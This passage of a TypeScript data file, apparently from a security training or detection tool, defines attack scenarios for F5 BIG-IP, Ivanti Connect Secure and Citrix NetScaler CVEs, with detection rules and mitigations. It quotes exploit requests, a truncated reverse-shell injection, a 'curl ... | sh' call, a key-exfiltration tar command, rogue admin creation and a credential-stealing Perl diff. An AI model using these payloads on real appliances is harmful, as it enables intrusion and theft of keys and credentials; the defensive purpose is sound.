      value: 'T1190 (Exploit Public App) · T1136.001 (Create Local Account) · T1059.004 (Bash RCE)',
    },
    {
      term: 'SMUGGLED AJP ATTRS',
      value: 'REMOTEROLE=0 (Administrator) & REMOTEUSER=admin via mod_proxy_ajp',
    },
    {
      term: 'VULNERABLE ENDPOINT',
      value: '/tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp',
    },
  ],
  nodes: [
    {
      id: 'f5_exploit_actor',
      label: 'Threat Actor (AJP Smuggler)',
      sublabel: '198.51.100.33 (Exploit Operator)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'External Exploit Operator',
        pidOrPort: 'HTTPS :443 / :8443 -> BIG-IP TMUI',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp',
          'Smuggled AJP Packet: REMOTEROLE=0 & REMOTEUSER=admin',
        ],
        description:
          'Attacker sending a crafted HTTP POST request that overflows the Apache mod_proxy_ajp buffer boundary into a second smuggled AJP request.',
      },
    },
    {
      id: 'f5_apache_tmui',
      label: 'BIG-IP Apache Frontend (httpd)',
      sublabel: '172.16.20.5:443 (mod_auth_pam_external)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'F5 BIG-IP TMUI Apache Reverse Proxy',
        pidOrPort: 'Process: /usr/sbin/httpd (mod_proxy_ajp)',
        privilege: 'apache / root',
        artifacts: [
          '/var/log/httpd/httpd_errors',
          'Forwards AJP13 stream over localhost:8009 to Tomcat',
        ],
        description:
          'Frontend Apache httpd server on F5 BIG-IP that forwards requests over AJP13 (TCP 8009) to the internal Tomcat servlet container.',
      },
    },
    {
      id: 'f5_tomcat_ajp',
      label: 'Tomcat AJP Backend & tmsh',
      sublabel: '127.0.0.1:8009 (tmshCmd.jsp -> bash)',
      role: 'process',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Apache Tomcat Servlet Engine & F5 tmsh',
        pidOrPort: 'TCP 127.0.0.1:8009 · /usr/bin/tmsh',
        privilege: 'root (UID 0)',
        artifacts: [
          'Executes: create cli alias private list command /bin/bash',
          'Executes: tmsh create auth user f5_support_adm role admin',
        ],
        description:
          'Backend Tomcat server that blindly trusts the smuggled AJP attributes (REMOTEROLE=0) and executes arbitrary tmsh commands.',
      },
    },
    {
      id: 'bigip_ltm_keyvault',
      label: 'BIG-IP SSL Keys & Backend Pool',
      sublabel: '/config/bigip.conf & /config/ssl/ssl.key/',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'F5 BIG-IP Local Traffic Manager (LTM) Config & Keys',
        pidOrPort: '/config/ssl/ssl.key/ & Internal Server Pool',
        privilege: 'Tier-0 Load Balancer',
        artifacts: [
          'Exfiltrated TLS Private Keys (/config/ssl/ssl.key/)',
          'Modified iRules for Credential Harvesting',
        ],
        description:
          'F5 BIG-IP configuration store containing enterprise TLS private keys, virtual server definitions, and backend pool credentials.',
      },
    },
    {
      id: 'f5_audit_siem',
      label: 'F5 Syslog & Suricata SIEM',
      sublabel: '/var/log/audit & /var/log/ltm',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Enterprise SIEM & Intrusion Detection',
        pidOrPort: '/var/log/audit, /var/log/httpd & Suricata',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: CVE-2023-46747 AJP Request Smuggling on tmshCmd.jsp',
          'Audit: MCD_AUDIT user=admin command="create auth user"',
        ],
        description:
          'Monitors F5 /var/log/audit for unexpected tmsh user creation and bash alias modification.',
      },
    },
  ],
  processTree: [
    {
      pid: 3110,
      ppid: 1,
      name: 'java (Tomcat TMUI)',
      commandLine: '/usr/lib/jvm/jre/bin/java -Dcatalina.base=/var/tomcat ...',
      user: 'tomcat',
      integrity: 'High',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'AjpProcessor.service()',
        'Runtime.getRuntime().exec("/usr/bin/tmsh")',
      ],
    },
    {
      pid: 14892,
      ppid: 3110,
      name: '/usr/bin/tmsh -> /bin/bash',
      commandLine:
        '/usr/bin/tmsh -a create cli alias private list command /bin/bash',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['execve("/bin/bash")', 'open("/config/bigip.conf")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'TMUI AJP REQUEST SMUGGLING (CVE-2023-46747)',
      subtitle: 'Smuggling REMOTEROLE=0 & REMOTEUSER=admin over TCP 127.0.0.1:8009',
      description:
        'As detailed in F5 K000137353 and Praetorian research, the attacker sends an HTTP POST request to /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp (or /tmui/Control/form) with crafted form parameters that desynchronize the AJP13 parser between Apache httpd and Tomcat, injecting a second AJP request with REMOTEROLE=0 (Administrator).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['f5_exploit_actor', 'f5_apache_tmui', 'f5_tomcat_ajp'],
      compromisedNodeIds: ['f5_apache_tmui', 'f5_tomcat_ajp'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-46747 (CVSS 9.8 Unauthenticated RCE)' },
        { term: 'PROTOCOL FLAW', value: 'Apache mod_proxy_ajp -> Tomcat AJP13 Request Smuggling' },
        { term: 'FORGED ATTRIBUTES', value: 'REMOTEUSER=admin & REMOTEROLE=0 (Administrator)' },
      ],
    },
    {
      index: 2,
      title: 'ROGUE ADMIN ACCOUNT CREATION VIA TMSHCMD.JSP',
      subtitle: 'Executing tmsh create auth user via smuggled Tomcat request',
      description:
        'Using the smuggled administrative context inside tmshCmd.jsp, the attacker invokes tmsh commands or the System.Users.create SOAP handler to provision a persistent administrator account (e.g., f5_support_adm) with bash shell access.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1136.001',
      mitreTechniqueName: 'Create Account: Local Account',
      activeNodeIds: ['f5_tomcat_ajp', 'f5_audit_siem'],
      compromisedNodeIds: ['f5_apache_tmui', 'f5_tomcat_ajp'],
      keySpecs: [
        { term: 'TMSH PAYLOAD', value: 'tmsh create auth user f5_support_adm password ... shell bash role admin' },
        { term: 'AUDIT LOG', value: '/var/log/audit -> user=admin cmd_data="create auth user"' },
        { term: 'BYPASSED LAYER', value: 'Apache PAM Authentication (mod_auth_pam_external)' },
      ],
    },
    {
      index: 3,
      title: 'ROOT BASH EXECUTION & SSL PRIVATE KEY EXFILTRATION',
      subtitle: 'Running arbitrary bash commands as root and dumping /config/ssl/ssl.key/',
      description:
        'With root bash access via tmsh alias injection (create cli alias private list command /bin/bash) or the newly created admin user, the attacker extracts enterprise TLS private keys from /config/ssl/ssl.key/ and deploys web shells.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.004',
      mitreTechniqueName: 'Command and Scripting Interpreter: Unix Shell',
      activeNodeIds: ['f5_tomcat_ajp', 'bigip_ltm_keyvault', 'f5_audit_siem'],
      compromisedNodeIds: ['f5_apache_tmui', 'f5_tomcat_ajp', 'bigip_ltm_keyvault'],
      keySpecs: [
        { term: 'BASH GADGET', value: 'tmsh create cli alias private list command /bin/bash' },
        { term: 'STOLEN ASSETS', value: '/config/bigip.conf & /config/ssl/ssl.key/*.key' },
        { term: 'F5 MITIGATION', value: 'K000137353 Script (Block AJP Smuggling & Restrict TMUI)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'f5-ajp-1',
      no: 1,
      stageIndex: 1,
      timestamp: '06:18:02.310',
      sourceNodeId: 'f5_exploit_actor',
      targetNodeId: 'f5_apache_tmui',
      sourceLabel: '198.51.100.33',
      targetLabel: 'BIG-IP TMUI :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata CVE-2023-46747',
      shortAction: 'AJP SMUGGLING POST',
      info: 'POST /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp with Smuggled AJP13 Frame (0x1234)',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Suricata detects an HTTP POST to /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp containing embedded AJP13 protocol magic bytes and REMOTEROLE=0.',
      rawLog: `POST /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1
Host: 172.16.20.5:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 942

command=create+cli+alias+private+list+command+%2Fbin%2Fbash&_bufvalue=REMOTEROLE%00%00%010%00%0A...`,
      detectionRule: {
        type: 'SURICATA',
        title: 'F5 BIG-IP CVE-2023-46747 TMUI AJP Request Smuggling Exploit',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"F5 BIG-IP CVE-2023-46747 TMUI AJP Request Smuggling"; flow:established,to_server; http.uri; content:"/tmui/Control/"; http.request_body; content:"REMOTEROLE"; classtype:attempted-admin; sid:202346747; rev:1;)`,
        mitigation:
          'Block external access to the BIG-IP Traffic Management User Interface (TMUI) on Self-IPs and apply F5 K000137353 patches.',
      },
    },
    {
      id: 'f5-ajp-2',
      no: 2,
      stageIndex: 2,
      timestamp: '06:18:03.115',
      sourceNodeId: 'f5_tomcat_ajp',
      targetNodeId: 'f5_audit_siem',
      sourceLabel: 'Tomcat / tmsh',
      targetLabel: '/var/log/audit',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'BIG-IP /var/log/audit',
      shortAction: 'CREATE AUTH USER',
      info: 'notice mcpd[5810]: 01070417:5: AUDIT - user admin - transaction #19482 - object 0 - create { user_role_partition { user_role_partition_user "f5_support_adm" } }',
      sizeOrCode: 'Audit 01070417',
      severity: 'CRITICAL',
      mitreId: 'T1136.001',
      explanation:
        'F5 /var/log/audit records mcpd transaction 01070417 creating a new administrator account or modifying CLI aliases without a corresponding legitimate login event in /var/log/secure.',
      rawLog: `Nov 13 06:18:03 bigip-prod-01 notice mcpd[5810]: 01070417:5: AUDIT - client tmsh, tmsh-pid-14892, user admin - transaction #19482-2 - object 0 - create { user_role_partition { user_role_partition_user "f5_support_adm" user_role_partition_role 0 user_role_partition_partition "[All]" } } [Status=Command OK]`,
      detectionRule: {
        type: 'SIGMA',
        title: 'F5 BIG-IP Unauthorized Admin User or CLI Alias Creation (CVE-2023-46747)',
        ruleCode: `title: F5 BIG-IP TMUI Suspicious User or CLI Alias Creation
logsource:
  product: f5
  service: audit
detection:
  selection:
    Message|contains:
      - 'create { user_role_partition'
      - 'cli_alias_command "/bin/bash"'
  condition: selection
level: critical`,
        mitigation:
          'Correlate every mcpd 01070417 user creation in /var/log/audit against interactive PAM logins in /var/log/secure.',
      },
    },
    {
      id: 'f5-ajp-3',
      no: 3,
      stageIndex: 3,
      timestamp: '06:18:05.840',
      sourceNodeId: 'f5_tomcat_ajp',
      targetNodeId: 'bigip_ltm_keyvault',
      sourceLabel: 'tmshCmd.jsp (root)',
      targetLabel: '/config/ssl/ssl.key/',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd SYSCALL 59',
      shortAction: 'TMSH BASH RCE',
      info: 'SYSCALL execve /bin/bash -c "tar -czf - /config/ssl/ssl.key/ /config/bigip.conf | base64"',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1059.004',
      explanation:
        'The attacker invokes /bin/bash through the hijacked tmsh alias to archive and exfiltrate /config/bigip.conf and SSL private keys.',
      rawLog: `Nov 13 06:18:05 bigip-prod-01 notice tmsh[14910]: 01420002:5: AUDIT - pid=14910 user=root folder=/Common module=(tmos)# status=[Command OK] cmd_data=list /util bash -c "id; tar -czf - /config/ssl/ssl.key/"`,
      detectionRule: {
        type: 'SIGMA',
        title: 'F5 BIG-IP tmsh Executing /util bash or Private Alias',
        ruleCode: `title: F5 BIG-IP TMSH Bash Execution Detected
logsource:
  product: f5
  service: audit
detection:
  selection:
    cmd_data|contains:
      - '/util bash'
      - '/bin/bash'
      - '/config/ssl/ssl.key'
  condition: selection
level: critical`,
        mitigation:
          'Rotate all SSL/TLS certificates and backend pool credentials stored on compromised BIG-IP appliances.',
      },
    },
  ],
};

export const SPLUNK_IVANTI_CONNECT_SECURE_SCENARIO: AttackScenario = {
  id: 'splunk-ivanti-connect-secure',
  code: 'CVE-2024-21887',
  name: 'Splunk STRT & Mandiant — Ivanti Connect Secure (UNC5221): Auth Bypass, RCE & ZIPLINE Backdoor',
  shortSubtitle: 'Splunk STRT / Mandiant UNC5221 · CVE-2023-46805 + CVE-2024-21887, libdsupgrade.so ZIPLINE & CAV Tamper',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Analyzed extensively by the Splunk Threat Research Team (STRT), Mandiant (UNC5221), and Volexity (UTA0178), attackers chained an authentication bypass via path traversal (CVE-2023-46805) with an administrative command injection flaw (CVE-2024-21887) in Ivanti Connect Secure VPN appliances. UNC5221 deployed the ZIPLINE passive ELF backdoor by trojanizing /home/lib/libdsupgrade.so, modified /home/perl/DSLog.pm to steal plaintext VPN passwords, and patched the built-in Integrity Checker (cav-0.1-py2.7.egg) to hide modifications.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Splunk Threat Research Team (ESCU) & Mandiant UNC5221 ZIPLINE Analysis',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-46805 / CVE-2024-21887) · T1574.006 (ZIPLINE Shared Lib) · T1556 (DSLog.pm)',
    },
    {
      term: 'BACKDOOR ARTIFACT',
      value: 'ZIPLINE (/home/lib/libdsupgrade.so Hooked into /home/bin/web) & Wirefilter.py',
    },
    {
      term: 'EXPLOIT URI CHAIN',
      value: '/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
    },
  ],
  nodes: [
    {
      id: 'unc5221_actor',
      label: 'UNC5221 / UTA0178 Actor',
      sublabel: '198.51.100.145 (Zero-Day Operator)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'China-Nexus Espionage Cluster (UNC5221)',
        pidOrPort: 'HTTPS :443 -> Ivanti Connect Secure REST API',
        privilege: 'Unauthenticated External',
        artifacts: [
          'URI: /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
          'Trigger String: "I5033248" (ZIPLINE Magic Header)',
        ],
        description:
          'UNC5221 threat actor chaining CVE-2023-46805 path traversal with CVE-2024-21887 JSON command injection.',
      },
    },
    {
      id: 'ivanti_vpn_gateway',
      label: 'Ivanti Connect Secure VPN',
      sublabel: '172.16.12.10 (/home/bin/web)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Ivanti Connect Secure (Pulse Connect Secure Linux)',
        pidOrPort: 'Process: /home/bin/web & REST API Server',
        privilege: 'root (UID 0)',
        artifacts: [
          '/home/perl/DSLog.pm (Modified for Credential Harvesting)',
          '/home/venv3/lib/python3.6/site-packages/cav-0.1-py2.7.egg (Tampered Integrity Checker)',
        ],
        description:
          'Enterprise SSL-VPN appliance where the REST API command injection executes arbitrary shell commands as root.',
      },
    },
    {
      id: 'zipline_elf_backdoor',
      label: 'ZIPLINE Passive Backdoor',
      sublabel: '/home/lib/libdsupgrade.so (Hooked accept)',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Trojanized ELF Shared Library (ZIPLINE)',
        pidOrPort: 'Loaded by /home/bin/web · Hooks accept/read',
        privilege: 'Appliance Root Memory',
        artifacts: [
          'Checks inbound socket buffer for magic string "I5033248"',
          'Provides Reverse Tunnel, File Upload/Download & Proxy',
        ],
        description:
          'Passive ELF backdoor implanted inside /home/lib/libdsupgrade.so that intercepts network sockets inside /home/bin/web when it sees the magic header "I5033248".',
      },
    },
    {
      id: 'corp_vpn_sessions',
      label: 'Active Directory & VPN Sessions',
      sublabel: '10.10.0.0/16 (Plaintext Auth & Pivot)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Internal Corporate Network & AD',
        pidOrPort: 'Harvested DSID Cookies & Plaintext Passwords',
        privilege: 'VPN Authenticated Users & Admins',
        artifacts: [
          'Stolen Plaintext Credentials from Modified DSLog.pm',
          'Internal SMB / RDP Lateral Pivoting via ZIPLINE Proxy',
        ],
        description:
          'Internal enterprise servers reached using plaintext VPN credentials harvested by the trojanized Perl login handler.',
      },
    },
    {
      id: 'splunk_escu_siem',
      label: 'Splunk Enterprise Security (STRT)',
      sublabel: 'Web Access Logs & External ICT Scanner',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Splunk SIEM running STRT ESCU Detections',
        pidOrPort: 'Ivanti Syslog, Suricata & External ICT',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Splunk ESCU: Ivanti Connect Secure Auth Bypass CVE-2023-46805',
          'YARA: Mandiant_ZIPLINE_ELF_Backdoor',
        ],
        description:
          'Runs Splunk Threat Research Team (STRT) analytics detecting /api/v1/totp/user-backup-code/../../ path traversal and ZIPLINE indicators.',
      },
    },
  ],
  processTree: [
    {
      pid: 1412,
      ppid: 1,
      name: 'python3 (Ivanti REST API)',
      commandLine: '/home/venv3/bin/python3 /home/restservice/rest_server.py',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'cloud_server_test_connection()',
        'subprocess.Popen("; curl ... | sh", shell=True)',
      ],
    },
    {
      pid: 2048,
      ppid: 1,
      name: '/home/bin/web (ZIPLINE Hook)',
      commandLine: '/home/bin/web (Loads trojanized /home/lib/libdsupgrade.so)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'dlopen("/home/lib/libdsupgrade.so")',
        'read(fd, buf, 8) -> memcmp(buf, "I5033248", 8)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F8C20100000',
          section: '/home/lib/libdsupgrade.so (ZIPLINE)',
          permissions: 'R-X',
          size: '72 KB',
          status: 'injected',
          description:
            'Trojanized libdsupgrade.so loaded into /home/bin/web inspecting incoming SSL-VPN connections for magic string I5033248.',
          hexPreview: '7F 45 4C 46 02 01 01 00 49 35 30 33 33 32 34 38',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'PATH TRAVERSAL AUTH BYPASS & RCE (CVE-2023-46805 + CVE-2024-21887)',
      subtitle: 'Chaining /api/v1/totp/user-backup-code/../../ with cloud-server-test-connection',
      description:
        'As documented by Splunk STRT and Mandiant, the attacker requests /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection. The ../.. traversal bypasses authentication (CVE-2023-46805), and shell metacharacters inside the JSON "type" parameter trigger root command execution (CVE-2024-21887).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['unc5221_actor', 'ivanti_vpn_gateway', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway'],
      keySpecs: [
        { term: 'AUTH BYPASS', value: 'CVE-2023-46805 (/api/v1/totp/user-backup-code/../../)' },
        { term: 'COMMAND INJECTION', value: 'CVE-2024-21887 (cloud-server-test-connection JSON "type")' },
        { term: 'PRIVILEGE', value: 'Unauthenticated Remote Root Execution (UID 0)' },
      ],
    },
    {
      index: 2,
      title: 'ZIPLINE ELF BACKDOOR IN LIBDSUPGRADE.SO & CAV TAMPERING',
      subtitle: 'Replacing /home/lib/libdsupgrade.so and neutralizing the internal Integrity Checker',
      description:
        'UNC5221 remounts the filesystem read-write and replaces /home/lib/libdsupgrade.so with the ZIPLINE passive ELF backdoor. Loaded into /home/bin/web, ZIPLINE waits for incoming connections beginning with the ASCII magic string "I5033248". Simultaneously, the attacker modifies cav-0.1-py2.7.egg so the built-in Integrity Checker Tool (ICT) reports 0 modified files.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1574.006',
      mitreTechniqueName: 'Hijack Execution Flow: Dynamic Linker Hijacking',
      activeNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor'],
      keySpecs: [
        { term: 'PASSIVE BACKDOOR', value: 'ZIPLINE (/home/lib/libdsupgrade.so in /home/bin/web)' },
        { term: 'MAGIC TRIGGER', value: 'ASCII Header "I5033248" on TCP 443' },
        { term: 'DEFENSE EVASION', value: 'Patches cav-0.1-py2.7.egg to spoof clean ICT scan results' },
      ],
    },
    {
      index: 3,
      title: 'DSLOG.PM CREDENTIAL HARVESTING & INTERNAL TUNNELING',
      subtitle: 'Intercepting plaintext VPN logins and proxying into Active Directory',
      description:
        'By injecting Perl code into /home/perl/DSLog.pm and CompCheckResult.cgi, the attacker captures plaintext Active Directory credentials as users log into the VPN and uses ZIPLINE as a SOCKS proxy to move laterally into the corporate network.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1556',
      mitreTechniqueName: 'Modify Authentication Process',
      activeNodeIds: ['zipline_elf_backdoor', 'corp_vpn_sessions', 'unc5221_actor', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor', 'corp_vpn_sessions'],
      keySpecs: [
        { term: 'MODIFIED PERL', value: '/home/perl/DSLog.pm & /home/webserver/htdocs/dana-na/auth/compcheckresult.cgi' },
        { term: 'STOLEN DATA', value: 'Plaintext AD Usernames, Passwords & Session Cookies' },
        { term: 'MANDIANT CLUSTER', value: 'UNC5221 (Zero-Day Espionage Actor)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'spl-iv-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:41:09.120',
      sourceNodeId: 'unc5221_actor',
      targetNodeId: 'ivanti_vpn_gateway',
      sourceLabel: '198.51.100.145',
      targetLabel: 'Ivanti VPN :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Splunk ESCU / Suricata',
      shortAction: 'CVE-2024-21887 RCE',
      info: 'POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Splunk Threat Research Team (STRT) detection rule matches the /api/v1/totp/user-backup-code/../../ path traversal chained with cloud-server-test-connection.',
      rawLog: `POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection HTTP/1.1
Host: 172.16.12.10
Content-Type: application/json

{"type": ";python3 -c 'import socket,subprocess,os; ...';", "txtGCPProject": "a", "txtGCPSecret": "a", "txtGCPPath": "a", "txtGCPBucket": "a"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Splunk STRT — Ivanti Connect Secure Auth Bypass & RCE (CVE-2023-46805 / CVE-2024-21887)',
        ruleCode: `title: Ivanti Connect Secure Path Traversal and Command Injection
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/api/v1/totp/user-backup-code/../../'
      - '/api/v1/cav/client/status/../../'
      - 'cloud-server-test-connection'
  condition: selection
level: critical`,
        mitigation:
          'Apply Ivanti Connect Secure patches, run the external Integrity Checker Tool (ICT), and factory-reset any appliance showing signs of compromise.',
      },
    },
    {
      id: 'spl-iv-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:41:14.702',
      sourceNodeId: 'ivanti_vpn_gateway',
      targetNodeId: 'zipline_elf_backdoor',
      sourceLabel: '/home/bin/web',
      targetLabel: '/home/lib/libdsupgrade.so',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'Mandiant YARA ZIPLINE',
      shortAction: 'ZIPLINE ELF HOOK',
      info: 'Trojanized /home/lib/libdsupgrade.so loaded in /home/bin/web checking for magic string "I5033248"',
      sizeOrCode: '72 KB ELF',
      severity: 'CRITICAL',
      mitreId: 'T1574.006',
      explanation:
        'Mandiant documented that ZIPLINE intercepts read() inside /home/bin/web and activates its covert C2 handler when it receives the 8-byte string "I5033248".',
      rawLog: `[EXTERNAL_ICT_SNAPSHOT_DIFF]
Modified ELF Shared Object: /home/lib/libdsupgrade.so
Expected SHA256: 2c81a9f0...
Actual SHA256:   e94b107c... (MATCH: Mandiant_Backdoor_Linux_ZIPLINE)
Modified Python Egg: /home/venv3/lib/python3.6/site-packages/cav-0.1-py2.7.egg
Embedded String: "I5033248", "/tmp/data/root/etc/ld.so.preload"`,
      detectionRule: {
        type: 'YARA',
        title: 'Mandiant Official YARA — M_Hunting_Backdoor_ZIPLINE_1',
        ruleCode: `rule Mandiant_Backdoor_Linux_ZIPLINE {
  meta:
    author = "Mandiant"
    description = "Detects ZIPLINE passive ELF backdoor in libdsupgrade.so"
  strings:
    $magic = "I5033248" ascii
    $path1 = "/tmp/data/root/home/lib/libdsupgrade.so" ascii
    $path2 = "send_file_to_server" ascii
  condition:
    uint32(0) == 0x464C457F and ($magic or ($path1 and $path2))
}`,
        mitigation:
          'Use only the external, boot-time Integrity Checker Tool (ICT) rather than the internal web UI scanner (which UNC5221 patches via cav-0.1-py2.7.egg).',
      },
    },
    {
      id: 'spl-iv-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:45:29.880',
      sourceNodeId: 'zipline_elf_backdoor',
      targetNodeId: 'corp_vpn_sessions',
      sourceLabel: '/home/perl/DSLog.pm',
      targetLabel: 'compcheckresult.cgi',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'File Integrity Alert',
      shortAction: 'DSLOG.PM CRED STEAL',
      info: 'Modified /home/perl/DSLog.pm writing plaintext VPN credentials to /home/webserver/htdocs/dana-na/',
      sizeOrCode: 'Cred Harvest',
      severity: 'CRITICAL',
      mitreId: 'T1556',
      explanation:
        'UNC5221 modifies Perl authentication modules on the Ivanti appliance to log every user and administrator password in plaintext.',
      rawLog: `[FILE_INTEGRITY_DIFF] /home/perl/DSLog.pm
+ open(my $fh, '>>', '/home/webserver/htdocs/dana-na/css/ds_cache.css');
+ print $fh encode_base64("$user:$password:$realm\\n");
+ close($fh);`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Ivanti Connect Secure Unauthenticated Access to Static CSS/CGI Dropzone',
        ruleCode: `title: Suspicious Webshell / Credential Drop Access on Ivanti Dana-NA Path
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/dana-na/auth/compcheckresult.cgi'
      - '/dana-na/css/'
    sc-status: 200
  condition: selection
level: high`,
        mitigation:
          'Revoke all active VPN sessions, rotate all LDAP/RADIUS bind account passwords, and reset credentials for all users who authenticated through the appliance.',
      },
    },
  ],
};

export const SPLUNK_CITRIX_BLEED_SESSION_HIJACK_SCENARIO: AttackScenario = {
  id: 'splunk-citrix-bleed-session-hijack',
  code: 'CVE-2023-4966',
  name: 'Splunk STRT, Mandiant & CISA — Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack',
  shortSubtitle: 'Splunk STRT / Mandiant / CISA AA23-325A · CVE-2023-4966 Host Header Leak, NSC_AAAC Cookie & VDI Pivot',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by the Splunk Threat Research Team (STRT), Mandiant, and Joint CISA Advisory AA23-325A, Citrix Bleed (CVE-2023-4966) is an unauthenticated out-of-bounds memory read in Citrix NetScaler ADC and NetScaler Gateway. Sending an HTTP GET request to /oauth/idp/.well-known/openid-configuration with a 24,000+ byte Host header causes snprintf to return a length larger than the buffer, leaking adjacent process memory containing active 65-byte NSC_AAAC session tokens and bypassing MFA completely.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Splunk Threat Research Team (STRT), Mandiant & CISA Advisory AA23-325A',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-4966) · T1539 (Steal NSC_AAAC Cookie) · T1550.004 (Pass the Cookie)',
    },
    {
      term: 'VULNERABLE ENDPOINT',
      value: 'GET /oauth/idp/.well-known/openid-configuration (Oversized Host: Header)',
    },
    {
      term: 'LEAKED ARTIFACT',
      value: '65-Byte Hexadecimal NSC_AAAC Session Token in HTTP Response Body',
    },
  ],
  nodes: [
    {
      id: 'citrix_bleed_actor',
      label: 'Threat Actor (LockBit / UNC)',
      sublabel: '198.51.100.62 (Memory Bleed Scanner)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'Ransomware / Espionage Intrusion Operator',
        pidOrPort: 'HTTPS :443 -> NetScaler OpenID Endpoint',
        privilege: 'Unauthenticated External',
        artifacts: [
          'GET /oauth/idp/.well-known/openid-configuration',
          'Host: AAAA... (24,576 Bytes) -> Regex [0-9a-f]{32,65}',
        ],
        description:
          'Attacker sending oversized Host headers to leak NetScaler nsppe packet-engine memory and extract active NSC_AAAC session cookies.',
      },
    },
    {
      id: 'netscaler_gateway',
      label: 'Citrix NetScaler ADC / Gateway',
      sublabel: '172.16.8.10 (nsppe Packet Engine)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Citrix NetScaler ADC / Gateway Appliance (FreeBSD)',
        pidOrPort: 'Process: nsppe (NetScaler Packet Processing Engine)',
        privilege: 'Appliance Memory Space',
        artifacts: [
          'ns_aaa_oauthrp_send_openid_config() snprintf OOB Read',
          'Leaked Memory Buffer Containing Active NSC_AAAC Tokens',
        ],
        description:
          'Perimeter Citrix NetScaler Gateway whose OpenID configuration endpoint leaks adjacent heap/stack memory in the HTTP 200 response.',
      },
    },
    {
      id: 'nsc_aaac_session_replay',
      label: 'Hijacked NSC_AAAC Session',
      sublabel: 'Cookie: NSC_AAAC=4f8a91c2... (MFA Bypassed)',
      role: 'process',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Replayed NetScaler AAA Session Cookie',
